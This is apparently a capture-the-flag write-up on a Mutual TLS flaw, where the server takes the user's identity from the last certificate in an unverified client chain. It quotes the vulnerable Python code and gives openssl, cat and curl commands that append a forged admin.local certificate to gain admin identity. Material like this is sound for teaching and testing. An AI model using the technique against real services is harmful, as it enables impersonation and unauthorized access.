This challenge was based on an awesome [article](https://github.blog/2023-08-17-mtls-when-certificate-authentication-is-done-wrong/) about flawed Mutual TLS implementations by Michael Stepankin. Check out section "Chapter 1: Improper certificate extraction", in which he explains how certificate extraction errors can lead to manipulation of credentials. His team found this vulnerability in Keycloak (CVE-2023-2422).

In this challenge, the user is given a standard client certificate chain for mtls authentication. The chain consists of a certificate (with CN=user.local) and a private key. A regular mtls implementation, like used by Python's ssl package, will just check if there is a valid chain provided and discard the rest. However, the server uses [get_unverified_chain](https://docs.python.org/3/library/ssl.html#ssl.SSLSocket.get_unverified_chain), which returns the complete chain provided by the client, and it uses the last one to determine the user's CN.
```
for cert in ssl_socket.get_unverified_chain():
    cert = cert
cert = crypto.load_certificate(crypto.FILETYPE_ASN1, cert)
subject = cert.get_subject().CN
```
So by providing the valid chain + some bogus certificate, one can change their CN (`subject` in the code).

To exploit this, one can simply:

### 1. Generate fake certificate
`openssl req -newkey rsa:2048 -nodes -x509 -subj /CN=admin.local -out client2-fake.crt`
### 2. Add cert to chain
`cat client.pem client2-fake.crt > sploit.pem`
### 3. Make request with malicious chain
`curl -k --cert sploit.pem https://mtls.wwctf.com`